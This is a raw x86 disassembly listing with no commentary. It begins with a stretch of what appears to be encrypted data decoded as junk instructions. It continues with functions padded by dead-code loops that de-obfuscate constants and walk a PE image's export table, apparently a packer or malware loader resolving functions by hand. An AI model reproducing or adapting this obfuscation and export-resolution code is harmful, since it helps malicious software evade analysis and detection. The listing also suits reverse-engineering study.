  42223e:	xchg   ebp,eax
  42223f:	dec    edx
  422240:	ret    0x22bc
  422243:	fnstenv [ecx-0x2c]
  422246:	xchg   ebx,eax
  422247:	push   esp
  422248:	mov    ecx,0x24a58da2
  42224d:	test   al,0xf6
  42224f:	psubusw mm2,QWORD PTR [esi]
  422252:	jae    0x42224e
  422254:	sbb    al,BYTE PTR [edi+ebp*2]
  422257:	psubd  mm7,QWORD PTR [esi-0x6f5e7a52]
  42225e:	mov    esp,DWORD PTR [eax]
  422260:	les    esp,FWORD PTR ds:0xf7f596ea
  422266:	scas   al,BYTE PTR es:[edi]
  422267:	mov    ?,WORD PTR [ecx+edi*4-0x5391b373]
  42226e:	add    al,0x4f
  422270:	popa   
  422271:	pop    eax
  422272:	das    
  422273:	in     al,0xa4
  422275:	fstp   DWORD PTR [edi+0x79]
  422278:	mov    esi,ebp
  42227a:	lods   eax,DWORD PTR ds:[esi]
  42227b:	inc    esi
  42227c:	outs   dx,BYTE PTR ds:[esi]
  42227d:	push   es
  42227e:	(bad)  
  42227f:	jecxz  0x4222a8
  422281:	sbb    BYTE PTR [ebx+0x45],dh
  422284:	jle    0x4222a0
  422286:	(bad)  
  422287:	cmp    DWORD PTR [eax],esp
  422289:	(bad)  [esi-0x4442e3dc]
  42228f:	and    edi,DWORD PTR [ebp+0x4d]
  422292:	das    
  422293:	push   esi
  422294:	cli    
  422295:	push   ecx
  422296:	add    DWORD PTR ds:0xb3aeeb9a,0xffffffff
  42229d:	scas   al,BYTE PTR es:[edi]
  42229e:	arpl   ax,dx
  4222a0:	outs   dx,DWORD PTR ds:[esi]
  4222a1:	adc    BYTE PTR [ecx+0x1173172e],ch
  4222a7:	dec    esp
  4222a8:	push   ds
  4222a9:	(bad)  [edi+0x1b]
  4222ac:	jmp    0x422301
  4222ae:	dec    ebp
  4222af:	adc    ebx,DWORD PTR [eax-0xb]
  4222b2:	data16 aad 0xfc
  4222b5:	mov    eax,0xabf0c7af
  4222ba:	xor    DWORD PTR [ecx-0x592a7924],eax
  4222c0:	imul   esi,DWORD PTR [bx+di+0x2143],0x79
  4222c6:	inc    eax
  4222c7:	psubusb mm3,QWORD PTR [ebx]
  4222ca:	sbb    edx,esp
  4222cc:	mov    bh,0xd6
  4222ce:	fcmovb st,st(7)
  4222d0:	dec    ecx
  4222d1:	jmp    0x31e6940d
  4222d6:	cmp    eax,0x2615259
  4222db:	dec    ebp
  4222dc:	cmp    ah,BYTE PTR [edx]
  4222de:	xor    esi,DWORD PTR [edx-0x9]
  4222e1:	xor    cl,BYTE PTR [edi]
  4222e3:	mov    ah,0x11
  4222e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222e6:	add    DWORD PTR ds:0x3961e61b,edx
  4222ec:	out    0x24,eax
  4222ee:	daa    
  4222ef:	sbb    DWORD PTR ds:0x2fcbbc1a,eax
  4222f5:	inc    edx
  4222f6:	jae    0x422327
  4222f8:	sti    
  4222f9:	icebp  
  4222fa:	outs   dx,BYTE PTR ds:[esi]
  4222fb:	fist   DWORD PTR [ebx-0x1cb163f]
  422301:	pop    edi
  422302:	ins    DWORD PTR es:[edi],dx
  422303:	sbb    edx,eax
  422305:	(bad)  
  422306:	mov    ebx,0xde8be8f5
  42230b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42230d:	or     ebp,DWORD PTR [edi-0x58]
  422310:	int3   
  422311:	je     0x4222d5
  422313:	mov    bh,0x2
  422315:	mov    DWORD PTR [esi-0x48],esp
  422318:	test   edi,esi
  42231a:	mov    ds:0x248c1c5e,al
  42231f:	dec    eax
  422320:	retf   
  422321:	imul   DWORD PTR [esp+esi*2-0x5334c088]
  422328:	ins    BYTE PTR es:[edi],dx
  422329:	rcr    DWORD PTR [edx-0x26],1
  42232c:	jne    0x4222bb
  42232e:	or     ecx,ecx
  422330:	and    eax,0xa18ea918
  422335:	fisub  WORD PTR fs:[ebx]
  422338:	cs lahf 
  42233a:	and    ah,BYTE PTR [edx]
  42233c:	cmp    dl,bh
  42233e:	cmp    ebp,DWORD PTR [eax]
  422340:	fisttp QWORD PTR [ecx-0x63550867]
  422346:	addr16 pushf 
  422348:	or     ah,BYTE PTR [ecx+edi*2-0x14db1d9e]
  42234f:	xor    DWORD PTR [eax],0xffffffb2
  422352:	fcomip st,st(6)
  422354:	push   ecx
  422355:	pop    esp
  422356:	jmp    0xaa68:0xaa8e88ed
  42235d:	xor    DWORD PTR [edx],edi
  42235f:	add    eax,ecx
  422361:	mov    al,bh
  422363:	mov    DWORD PTR [ebx+edx*4],0xde756a6b
  42236a:	in     al,0x5b
  42236c:	cdq    
  42236d:	mov    cl,al
  42236f:	lea    esp,[edi-0x42]
  422372:	clc    
  422373:	in     al,dx
  422374:	sbb    ebp,ebx
  422376:	mov    bl,0xba
  422378:	mov    al,0xeb
  42237a:	neg    DWORD PTR [edi-0x5]
  42237d:	xor    DWORD PTR [eax+esi*4+0x2ac08ded],0xffffffb3
  422385:	dec    ebx
  422386:	inc    ecx
  422387:	inc    ecx
  422388:	jns    0x4223af
  42238a:	sub    esp,esi
  42238c:	xchg   ah,dl
  42238e:	test   eax,0x7c5a6e8b
  422393:	xchg   edx,eax
  422394:	push   ss
  422395:	ret    0x702f
  422398:	imul   esp,DWORD PTR [edx-0x1ba7562f],0x77d9a7d3
  4223a2:	mov    dl,0x8
  4223a4:	adc    al,0x9c
  4223a6:	mov    esi,0x684afca7
  4223ab:	and    esi,DWORD PTR [edx+0x6b4ba248]
  4223b1:	addr16 cld 
  4223b3:	adc    eax,0xd1928412
  4223b8:	rcr    esi,cl
  4223ba:	js     0x4223e7
  4223bc:	add    ch,BYTE PTR [ecx+0x67]
  4223bf:	ss xchg edi,eax
  4223c1:	loopne 0x422433
  4223c3:	aas    
  4223c4:	in     eax,dx
  4223c5:	add    eax,0xcb7959c
  4223ca:	jns    0x4223ba
  4223cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223cd:	fwait
  4223ce:	mov    ebx,0x892a823
  4223d3:	dec    edi
  4223d4:	lods   al,BYTE PTR ds:[esi]
  4223d5:	div    bh
  4223d7:	int    0xbb
  4223d9:	dec    ecx
  4223da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223db:	xchg   DWORD PTR [edi-0x6169a567],edi
  4223e1:	adc    esp,DWORD PTR [eax+0x7]
  4223e4:	inc    eax
  4223e5:	jg     0x42242c
  4223e7:	add    al,al
  4223e9:	pop    edx
  4223ea:	cli    
  4223eb:	mov    eax,0x65be339b
  4223f0:	stc    
  4223f1:	outs   dx,BYTE PTR ds:[esi]
  4223f2:	enter  0x2666,0x5b
  4223f6:	xor    BYTE PTR [ecx+0x64],dl
  4223f9:	jp     0x4223fa
  4223fb:	mov    ds:0xf3b23657,al
  422400:	mov    ch,0x23
  422402:	sbb    edi,DWORD PTR es:[esi-0x53a9797c]
  422409:	or     BYTE PTR [eax-0x4e],dl
  42240c:	xchg   edi,eax
  42240d:	into   
  42240e:	sbb    ebx,esp
  422410:	js     0x422475
  422412:	stos   DWORD PTR es:[edi],eax
  422413:	add    al,0xb3
  422415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422416:	ja     0x422435
  422418:	pop    edi
  422419:	mov    ah,BYTE PTR cs:[edi+0x38]
  42241d:	sub    cl,dl
  42241f:	mov    cl,0x45
  422421:	xor    dh,dh
  422423:	and    al,0x5c
  422425:	dec    esp
  422426:	cmc    
  422427:	inc    edi
  422428:	add    DWORD PTR [edi],ebx
  42242a:	add    ch,BYTE PTR [ebx-0x6b]
  42242d:	gs pop ds
  42242f:	jmp    0x4223c0
  422431:	stos   BYTE PTR es:[edi],al
  422432:	scas   al,BYTE PTR es:[edi]
  422433:	dec    ecx
  422434:	cwde   
  422435:	aad    0x47
  422437:	jle    0x4224b6
  422439:	inc    ebp
  42243a:	inc    edx
  42243b:	dec    edx
  42243c:	es test eax,0x379acc55
  422442:	fst    st(2)
  422444:	mov    ds:0x46adf8d9,al
  422449:	or     eax,0xa1599716
  42244e:	pop    edx
  42244f:	(bad)  
  422450:	sbb    eax,0xc99b8c2
  422455:	jge    0x422422
  422457:	nop
  422458:	aaa    
  422459:	xor    BYTE PTR [ecx],al
  42245b:	sub    BYTE PTR [ecx+0x13],cl
  42245e:	in     eax,0x8e
  422460:	adc    eax,0xeac1e46d
  422465:	sbb    ebx,DWORD PTR [ecx-0x62b60645]
  42246b:	and    cl,BYTE PTR [ecx+0x30495016]
  422471:	jne    0x422447
  422473:	pop    edi
  422474:	adc    ch,ah
  422476:	fcomp  QWORD PTR [edx]
  422478:	mov    BYTE PTR [ecx],cl
  42247a:	add    al,0x4d
  42247c:	adc    ch,BYTE PTR [ebp-0x3a]
  42247f:	(bad)  
  422480:	lock into 
  422482:	adc    ch,BYTE PTR [edi+0x4f]
  422485:	lock jle 0x42242f
  422488:	push   0xffffffa6
  42248a:	outs   dx,DWORD PTR ds:[esi]
  42248b:	dec    ecx
  42248c:	addr16 aas 
  42248e:	xchg   ebx,eax
  42248f:	add    bl,ch
  422491:	xchg   DWORD PTR ds:0x9dcdc01b,esp
  422497:	cli    
  422498:	adc    cl,BYTE PTR [edi]
  42249a:	loopne 0x4224d9
  42249c:	stos   BYTE PTR es:[edi],al
  42249d:	adc    BYTE PTR [eax-0x7ec77e47],al
  4224a3:	ficom  WORD PTR [edx]
  4224a5:	mov    esi,0xd34db674
  4224aa:	xor    al,BYTE PTR [eax]
  4224ac:	and    DWORD PTR [ebx-0x7b3b9b77],edx
  4224b2:	mov    ds:0x216119c2,al
  4224b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224b9:	outs   dx,DWORD PTR ds:[esi]
  4224ba:	push   ds
  4224bb:	shl    DWORD PTR [eax-0x273a1277],1
  4224c1:	imul   ebx,DWORD PTR [ebx],0x9c5b0c2
  4224c7:	je     0x422493
  4224c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ca:	dec    BYTE PTR [eax+edx*1+0x11]
  4224ce:	cmp    BYTE PTR [esi-0x6535172],bl
  4224d4:	js     0x422471
  4224d6:	or     al,dh
  4224d8:	mov    al,0xfc
  4224da:	aam    0x65
  4224dc:	dec    eax
  4224dd:	into   
  4224de:	js     0x42255a
  4224e0:	add    BYTE PTR [esi+0x33],0xc3
  4224e4:	pinsrw mm0,WORD PTR [edi],0x67
  4224e8:	mov    bl,0x59
  4224ea:	pop    esp
  4224eb:	test   eax,ecx
  4224ed:	xchg   esp,eax
  4224ee:	int3   
  4224ef:	sub    al,0x4
  4224f1:	pop    ebx
  4224f2:	mov    ebx,0x53042e2e
  4224f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224f8:	dec    edx
  4224f9:	sub    DWORD PTR [ecx-0x57cc5f25],eax
  4224ff:	les    edi,FWORD PTR [edx]
  422501:	jne    0x4224e4
  422503:	aad    0xfe
  422505:	mov    fs,WORD PTR [eax-0x3f]
  422508:	and    DWORD PTR [ebx-0x506f53f3],ebx
  42250e:	adc    al,0x8b
  422510:	and    ah,BYTE PTR [esi-0x28]
  422513:	pop    ds
  422514:	xor    dl,bl
  422516:	mov    eax,ds:0x46dd427f
  42251b:	dec    ecx
  42251c:	aad    0xa0
  42251e:	sub    eax,DWORD PTR [ecx]
  422520:	mov    DWORD PTR [ebp-0x1c587fbf],edx
  422526:	or     al,0x8f
  422528:	xor    BYTE PTR [ebx],ch
  42252a:	inc    ebx
  42252b:	mov    bh,0x9b
  42252d:	data16 add bh,0x81
  422531:	iret   
  422532:	push   esi
  422533:	inc    ebp
  422534:	xchg   edx,eax
  422535:	mov    DWORD PTR [edi-0x4f9b3c03],ebp
  42253b:	xlat   BYTE PTR ds:[ebx]
  42253c:	and    bh,BYTE PTR [eax]
  42253e:	mov    BYTE PTR [edx+ebx*4],cl
  422541:	sub    BYTE PTR [eax+0x7d],ah
  422544:	(bad)  
  422545:	jnp    0x422530
  422547:	sub    edi,ecx
  422549:	sbb    al,0xdf
  42254b:	xchg   dh,al
  42254d:	xchg   ecx,eax
  42254e:	adc    bh,al
  422550:	push   ebx
  422551:	push   0xffffff8b
  422553:	or     eax,0x42836b
  422558:	add    DWORD PTR [eax],ecx
  42255a:	pop    edi
  42255b:	pop    esi
  42255c:	leave  
  42255d:	ret    
  42255e:	push   ebp
  42255f:	mov    ebp,esp
  422561:	sub    esp,0x18
  422564:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  42256b:	movzx  edx,WORD PTR ds:0x428673
  422572:	and    edx,DWORD PTR ds:0x42864f
  422578:	mov    DWORD PTR ds:0x428673,edx
  42257e:	lea    eax,[ebp+0x14]
  422581:	adc    DWORD PTR ds:0x428607,0x604f
  42258b:	mov    DWORD PTR [ebp-0x4],eax
  42258e:	mov    ecx,DWORD PTR ds:0x4285f3
  422594:	adc    DWORD PTR ds:0x4285df,ecx
  42259a:	push   esi
  42259b:	add    DWORD PTR ds:0x42861b,ecx
  4225a1:	mov    esi,0xf89c85b0
  4225a6:	or     DWORD PTR ds:0x4285db,0x4285f7
  4225b0:	mov    DWORD PTR [ebp-0xc],esi
  4225b3:	mov    DWORD PTR ds:0x42862f,0x1a
  4225bd:	cmp    DWORD PTR ds:0x42862f,0x0
  4225c4:	je     0x422628
  4225ca:	cmp    DWORD PTR ds:0x42862f,0xa
  4225d1:	jge    0x422628
  4225d7:	jmp    0x4225fc
  4225dc:	push   0x428673
  4225e1:	push   DWORD PTR [ebp-0x20]
  4225e4:	push   0x8204
  4225e9:	push   0x6126
  4225ee:	push   0x7868
  4225f3:	push   DWORD PTR [ebp-0x28]
  4225f6:	call   DWORD PTR ds:0x4287c7
  4225fc:	cmp    DWORD PTR ds:0x42862f,0xb
  422603:	jne    0x422616
  422609:	mov    edx,DWORD PTR ds:0x42862f
  42260f:	dec    edx
  422610:	mov    DWORD PTR ds:0x42862f,edx
  422616:	mov    edx,DWORD PTR ds:0x42862f
  42261c:	dec    edx
  42261d:	mov    DWORD PTR ds:0x42862f,edx
  422623:	jmp    0x4225bd
  422628:	lea    eax,[ebp-0xc]
  42262b:	mov    DWORD PTR [ebp-0x14],eax
  42262e:	mov    eax,DWORD PTR [ebp-0xc]
  422631:	or     DWORD PTR ds:0x42863f,0x672c
  42263b:	mov    edx,DWORD PTR [ebp-0x14]
  42263e:	mov    ecx,0x75108a4
  422643:	add    DWORD PTR ds:0x428617,0x428607
  42264d:	xor    eax,ecx
  42264f:	add    eax,0x3272ec
  422654:	sub    DWORD PTR ds:0x42862b,0x430
  42265e:	mov    DWORD PTR [edx],eax
  422660:	movzx  eax,WORD PTR ds:0x42861b
  422667:	sbb    eax,DWORD PTR ds:0x4285cf
  42266d:	mov    ds:0x42861b,eax
  422672:	mov    eax,ds:0x428167
  422677:	mov    DWORD PTR ds:0x428617,0x1a
  422681:	cmp    DWORD PTR ds:0x428617,0x0
  422688:	je     0x4226c4
  42268e:	cmp    DWORD PTR ds:0x428617,0x2a
  422695:	jl     0x4226c4
  42269b:	jmp    0x4226b0
  4226a0:	push   0x42860b
  4226a5:	push   0x428083
  4226aa:	call   DWORD PTR ds:0x4287cb
  4226b0:	xor    edx,edx
  4226b2:	xor    edx,DWORD PTR ds:0x428617
  4226b8:	dec    edx
  4226b9:	mov    DWORD PTR ds:0x428617,edx
  4226bf:	jmp    0x422681
  4226c4:	mov    edx,DWORD PTR [ebp-0x4]
  4226c7:	mov    eax,DWORD PTR [eax]
  4226c9:	add    eax,DWORD PTR [edx]
  4226cb:	neg    edx
  4226cd:	push   edi
  4226ce:	and    DWORD PTR ds:0x428613,0x0
  4226d8:	jmp    0x4226ea
  4226dd:	mov    edi,DWORD PTR ds:0x428613
  4226e3:	inc    edi
  4226e4:	mov    DWORD PTR ds:0x428613,edi
  4226ea:	cmp    DWORD PTR ds:0x428613,0x13
  4226f1:	jae    0x422729
  4226f7:	cmp    DWORD PTR ds:0x428613,0x14
  4226fe:	jb     0x422729
  422704:	jmp    0x422724
  422709:	push   0x5e63
  42270e:	push   DWORD PTR [ebp-0x10]
  422711:	push   0x40fa
  422716:	push   0x57ff
  42271b:	push   DWORD PTR [ebp-0x14]
  42271e:	call   DWORD PTR ds:0x42879f
  422724:	jmp    0x4226dd
  422729:	mov    DWORD PTR [ebp-0x8],eax
  42272c:	mov    edi,DWORD PTR [ebp+0x8]
  42272f:	mov    DWORD PTR ds:0x428643,0x13
  422739:	cmp    DWORD PTR ds:0x428643,0x0
  422740:	je     0x42278e
  422746:	cmp    DWORD PTR ds:0x428643,0x8
  42274d:	jb     0x42278e
  422753:	jmp    0x422763
  422758:	push   0x6e63
  42275d:	call   DWORD PTR ds:0x4287a3
  422763:	cmp    DWORD PTR ds:0x428643,0x9
  42276a:	jne    0x42277b
  422770:	mov    eax,ds:0x428643
  422775:	dec    eax
  422776:	mov    ds:0x428643,eax
  42277b:	xor    eax,eax
  42277d:	xor    eax,DWORD PTR ds:0x428643
  422783:	dec    eax
  422784:	mov    ds:0x428643,eax
  422789:	jmp    0x422739
  42278e:	mov    eax,ds:0x4282ef
  422793:	and    DWORD PTR ds:0x428647,0x0
  42279d:	xor    edx,edx
  42279f:	or     edx,DWORD PTR ds:0x428647
  4227a5:	inc    edx
  4227a6:	mov    DWORD PTR ds:0x428647,edx
  4227ac:	cmp    DWORD PTR ds:0x428647,0x8
  4227b3:	jb     0x4227f3
  4227b9:	jmp    0x4227cc
  4227be:	push   DWORD PTR [ebp-0x18]
  4227c1:	push   0x42804c
  4227c6:	call   DWORD PTR ds:0x4287a7
  4227cc:	cmp    DWORD PTR ds:0x428647,0x7
  4227d3:	jne    0x4227e6
  4227d9:	mov    edx,DWORD PTR ds:0x428647
  4227df:	inc    edx
  4227e0:	mov    DWORD PTR ds:0x428647,edx
  4227e6:	cmp    DWORD PTR ds:0x428647,0x16
  4227ed:	jb     0x42279d
  4227f3:	mov    eax,DWORD PTR [eax+0x198]
  4227f9:	and    DWORD PTR ds:0x428637,0x0
  422803:	mov    edx,DWORD PTR ds:0x428637
  422809:	inc    edx
  42280a:	mov    DWORD PTR ds:0x428637,edx
  422810:	cmp    DWORD PTR ds:0x428637,0x9
  422817:	jg     0x42285b
  42281d:	jmp    0x422832
  422822:	push   0x428034
  422827:	push   0x1
  422829:	push   DWORD PTR [ebp-0x1c]
  42282c:	call   DWORD PTR ds:0x4287ab
  422832:	cmp    DWORD PTR ds:0x428637,0x8
  422839:	jne    0x42284e
  42283f:	xor    edx,edx
  422841:	add    edx,DWORD PTR ds:0x428637
  422847:	inc    edx
  422848:	mov    DWORD PTR ds:0x428637,edx
  42284e:	cmp    DWORD PTR ds:0x428637,0x18
  422855:	jb     0x422803
  42285b:	xor    edi,ecx
  42285d:	mov    edx,0x3272ec
  422862:	add    edi,edx
  422864:	cmp    DWORD PTR [eax],edi
  422866:	je     0x422887
  42286c:	mov    DWORD PTR ds:0x42861f,0x7dc0
  422876:	mov    eax,DWORD PTR [eax]
  422878:	mov    DWORD PTR ds:0x428607,0x131c
  422882:	jmp    0x422b15
  422887:	mov    DWORD PTR ds:0x4285e3,edi
  42288d:	mov    eax,DWORD PTR [ebp+0x18]
  422890:	cmp    eax,esi
  422892:	mov    DWORD PTR ds:0x42864f,0x3fa2
  42289c:	jne    0x4228c0
  4228a2:	mov    DWORD PTR ds:0x42860b,0x3d29
  4228ac:	push   0xf89c85b1
  4228b1:	mov    DWORD PTR ds:0x42866b,0x6bac
  4228bb:	jmp    0x422b04
  4228c0:	mov    esi,DWORD PTR [ebp+0x18]
  4228c3:	mov    eax,0x14b4
  4228c8:	mov    eax,0xf89c85b2
  4228cd:	cmp    esi,eax
  4228cf:	jne    0x422af4
  4228d5:	mov    eax,DWORD PTR [ebp+0x10]
  4228d8:	adc    DWORD PTR ds:0x4285cf,0x1af0
  4228e2:	xor    eax,ecx
  4228e4:	mov    esi,DWORD PTR ds:0x4285ef
  4228ea:	sub    DWORD PTR ds:0x42860f,esi
  4228f0:	add    eax,edx
  4228f2:	and    DWORD PTR ds:0x42863f,0x0
  4228fc:	jmp    0x422910
  422901:	xor    esi,esi
  422903:	xor    esi,DWORD PTR ds:0x42863f
  422909:	inc    esi
  42290a:	mov    DWORD PTR ds:0x42863f,esi
  422910:	cmp    DWORD PTR ds:0x42863f,0x1d
  422917:	jae    0x422959
  42291d:	cmp    DWORD PTR ds:0x42863f,0xa
  422924:	jl     0x422959
  42292a:	jmp    0x42293a
  42292f:	push   0x428028
  422934:	call   DWORD PTR ds:0x4287af
  42293a:	cmp    DWORD PTR ds:0x42863f,0x9
  422941:	jne    0x422954
  422947:	mov    esi,DWORD PTR ds:0x42863f
  42294d:	inc    esi
  42294e:	mov    DWORD PTR ds:0x42863f,esi
  422954:	jmp    0x422901
  422959:	mov    DWORD PTR [ebp-0x18],eax
  42295c:	mov    eax,DWORD PTR [ebp+0xc]
  42295f:	mov    esi,DWORD PTR [ebp-0x8]
  422962:	xor    eax,ecx
  422964:	add    eax,edx
  422966:	imul   eax,DWORD PTR [esi]
  422969:	mov    esi,DWORD PTR [ebp+0x8]
  42296c:	xor    esi,ecx
  42296e:	add    esi,edx
  422970:	cmp    esi,eax
  422972:	mov    eax,DWORD PTR [ebp-0x4]
  422975:	push   ebx
  422976:	je     0x422995
  42297c:	mov    esi,DWORD PTR [ebp-0x18]
  42297f:	add    DWORD PTR [eax],esi
  422981:	mov    eax,DWORD PTR [ebp-0x4]
  422984:	mov    esi,DWORD PTR [ebp+0xc]
  422987:	xor    esi,ecx
  422989:	add    esi,edx
  42298b:	imul   esi,DWORD PTR [eax]
  42298e:	mov    DWORD PTR [eax],esi
  422990:	jmp    0x42299a
  422995:	mov    esi,DWORD PTR [ebp+0x14]
  422998:	xor    DWORD PTR [eax],esi
  42299a:	mov    eax,DWORD PTR [ebp-0x4]
  42299d:	mov    edi,DWORD PTR [ebp+0x10]
  4229a0:	xor    edi,ecx
  4229a2:	mov    esi,0xffcd8d14
  4229a7:	mov    ebx,esi
  4229a9:	sub    ebx,edi
  4229ab:	add    DWORD PTR [eax],ebx
  4229ad:	mov    eax,DWORD PTR [ebp-0x4]
  4229b0:	mov    edi,DWORD PTR [ebp-0x8]
  4229b3:	add    edi,DWORD PTR [eax]
  4229b5:	mov    DWORD PTR [ebp-0x8],edi
  4229b8:	mov    eax,DWORD PTR [ebp+0xc]
  4229bb:	mov    edi,DWORD PTR [ebp+0xc]
  4229be:	xor    edi,ecx
  4229c0:	xor    eax,ecx
  4229c2:	lea    eax,[eax+edi*1+0x64e5d8]
  4229c9:	mov    edi,DWORD PTR [ebp+0xc]
  4229cc:	xor    edi,ecx
  4229ce:	add    edi,edx
  4229d0:	imul   eax,edi
  4229d3:	mov    edi,DWORD PTR [ebp+0xc]
  4229d6:	xor    edi,ecx
  4229d8:	sub    edi,eax
  4229da:	mov    eax,DWORD PTR [ebp-0x4]
  4229dd:	add    edi,edx
  4229df:	cmp    DWORD PTR [eax],edi
  4229e1:	mov    eax,DWORD PTR [ebp-0x4]
  4229e4:	mov    edi,DWORD PTR [ebp+0x10]
  4229e7:	jg     0x4229fa
  4229ed:	xor    edi,ecx
  4229ef:	mov    ebx,esi
  4229f1:	sub    ebx,edi
  4229f3:	add    DWORD PTR [eax],ebx
  4229f5:	jmp    0x422a00
  4229fa:	xor    edi,ecx
  4229fc:	add    edi,edx
  4229fe:	add    DWORD PTR [eax],edi
  422a00:	mov    eax,DWORD PTR [ebp-0x8]
  422a03:	mov    edi,DWORD PTR [ebp-0x10]
  422a06:	mov    eax,DWORD PTR [eax]
  422a08:	xor    edi,ecx
  422a0a:	add    edi,0x3272eb
  422a10:	not    edi
  422a12:	and    eax,edi
  422a14:	movsx  di,BYTE PTR [eax+0x1]
  422a19:	mov    ebx,0x3b56
  422a1e:	sub    di,bx
  422a21:	mov    ebx,0x8a94
  422a26:	xor    di,bx
  422a29:	mov    ebx,0x4f90
  422a2e:	cmp    di,bx
  422a31:	jne    0x422a59
  422a37:	movsx  di,BYTE PTR [eax]
  422a3b:	mov    ebx,0x3b56
  422a40:	sub    di,bx
  422a43:	mov    ebx,0x8a94
  422a48:	xor    di,bx
  422a4b:	mov    ebx,0x4e63
  422a50:	cmp    di,bx
  422a53:	je     0x422a69
  422a59:	mov    edi,DWORD PTR [ebp-0x10]
  422a5c:	xor    edi,ecx
  422a5e:	mov    ebx,esi
  422a60:	sub    ebx,edi
  422a62:	add    eax,ebx
  422a64:	jmp    0x422a14
  422a69:	mov    esi,DWORD PTR [ebp-0x14]
  422a6c:	mov    esi,DWORD PTR [esi]
  422a6e:	mov    edi,DWORD PTR [eax+0x3c]
  422a71:	lea    esi,[edi+esi*8+0x78]
  422a75:	mov    esi,DWORD PTR [esi+eax*1]
  422a78:	mov    DWORD PTR [ebp-0x8],esi
  422a7b:	mov    esi,DWORD PTR [ebp+0x8]
  422a7e:	xor    esi,ecx
  422a80:	add    esi,edx
  422a82:	mov    DWORD PTR [ebp-0x14],esi
  422a85:	mov    esi,DWORD PTR [ebp+0x8]
  422a88:	mov    edi,DWORD PTR [ebp-0x8]
  422a8b:	xor    esi,ecx
  422a8d:	add    esi,edx
  422a8f:	pop    ebx
  422a90:	cmp    edi,esi
  422a92:	jne    0x422ab0
  422a98:	mov    eax,DWORD PTR [ebp+0xc]
  422a9b:	xor    eax,ecx
  422a9d:	mov    ecx,DWORD PTR [ebp-0x8]
  422aa0:	add    eax,edx
  422aa2:	imul   eax,ecx
  422aa5:	mov    DWORD PTR [ebp-0x8],eax
  422aa8:	push   DWORD PTR [ebp+0x18]
  422aab:	jmp    0x422b04
  422ab0:	mov    ecx,DWORD PTR [ebp-0x8]
  422ab3:	add    ecx,eax
  422ab5:	mov    DWORD PTR [ebp-0x14],ecx
  422ab8:	mov    ecx,DWORD PTR [ebp-0x14]
  422abb:	mov    ecx,DWORD PTR [ecx+0xc]
  422abe:	movsx  cx,BYTE PTR [ecx+eax*1]
  422ac3:	mov    edx,0x3b56
  422ac8:	sub    cx,dx
  422acb:	mov    edx,0x8a94
  422ad0:	xor    cx,dx
  422ad3:	mov    edx,0x4e61
  422ad8:	cmp    cx,dx
  422adb:	jne    0x422aa8
  422ae1:	mov    ecx,DWORD PTR ds:0x4282ef
  422ae7:	mov    ecx,DWORD PTR [ecx+0x198]
  422aed:	mov    DWORD PTR [ecx],eax
  422aef:	jmp    0x422b15
  422af4:	mov    ecx,DWORD PTR [ebp+0x18]
  422af7:	cmp    ecx,0xf89c85b1
  422afd:	jne    0x422b15
  422b03:	push   eax
  422b04:	push   DWORD PTR [ebp+0x14]
  422b07:	push   DWORD PTR [ebp+0x10]
  422b0a:	push   DWORD PTR [ebp+0xc]
  422b0d:	push   DWORD PTR [ebp+0x8]
  422b10:	call   0x42255e
  422b15:	pop    edi
  422b16:	pop    esi
  422b17:	leave  
  422b18:	ret    0x14
  422b1b:	push   ebp
  422b1c:	mov    ebp,esp
  422b1e:	sub    esp,0x54
  422b21:	add    DWORD PTR ds:0x428657,0x428603
  422b2b:	push   0x4283ff
  422b30:	call   DWORD PTR ds:0x4287cf
  422b36:	sbb    DWORD PTR ds:0x428647,0x42860b
  422b40:	test   eax,eax
  422b42:	je     0x422b59
  422b48:	xor    eax,eax
  422b4a:	mov    DWORD PTR ds:0x428677,0x34e1
  422b54:	jmp    0x423441
  422b59:	mov    DWORD PTR [ebp-0x2c],0x0
  422b60:	xor    ecx,0x686a
  422b66:	mov    eax,DWORD PTR [ebp-0x20]
  422b69:	mov    DWORD PTR [ebp-0x20],eax
  422b6c:	mov    ecx,0xf89c85b0
  422b71:	and    DWORD PTR ds:0x428647,0x0
  422b7b:	mov    edx,DWORD PTR ds:0x428647
  422b81:	inc    edx
  422b82:	mov    DWORD PTR ds:0x428647,edx
  422b88:	cmp    DWORD PTR ds:0x428647,0x27
  422b8f:	jge    0x422bb5
  422b95:	jmp    0x422ba8
  422b9a:	push   DWORD PTR [ebp-0xc]
  422b9d:	push   0x4285eb
  422ba2:	call   DWORD PTR ds:0x4287b3
  422ba8:	cmp    DWORD PTR ds:0x428647,0x19
  422baf:	jb     0x422b7b
  422bb5:	mov    DWORD PTR [ebp-0x4],ecx
  422bb8:	and    DWORD PTR ds:0x428647,0x0
  422bc2:	xor    edx,edx
  422bc4:	or     edx,DWORD PTR ds:0x428647
  422bca:	inc    edx
  422bcb:	mov    DWORD PTR ds:0x428647,edx
  422bd1:	cmp    DWORD PTR ds:0x428647,0xc
  422bd8:	jl     0x422c10
  422bde:	jmp    0x422be9
  422be3:	call   DWORD PTR ds:0x4287b7
  422be9:	cmp    DWORD PTR ds:0x428647,0xb
  422bf0:	jne    0x422c03
  422bf6:	mov    edx,DWORD PTR ds:0x428647
  422bfc:	inc    edx
  422bfd:	mov    DWORD PTR ds:0x428647,edx
  422c03:	cmp    DWORD PTR ds:0x428647,0x1f
  422c0a:	jb     0x422bc2
  422c10:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  422c17:	lea    eax,[ebp-0x14]
  422c1a:	xor    edx,DWORD PTR ds:0x42866b
  422c20:	mov    DWORD PTR [ebp-0x2c],eax
  422c23:	movzx  edx,BYTE PTR ds:0x428667
  422c2a:	add    DWORD PTR ds:0x4285d7,edx
  422c30:	lea    eax,[ebp-0x18]
  422c33:	mov    DWORD PTR [ebp-0x24],eax
  422c36:	movzx  eax,WORD PTR ds:0x428607
  422c3d:	add    DWORD PTR ds:0x428603,eax
  422c43:	mov    eax,ds:0x4282ef
  422c48:	neg    edx
  422c4a:	mov    eax,DWORD PTR [eax+0x1c8]
  422c50:	and    DWORD PTR ds:0x4285e7,0x0
  422c5a:	xor    edx,edx
  422c5c:	add    edx,DWORD PTR ds:0x4285e7
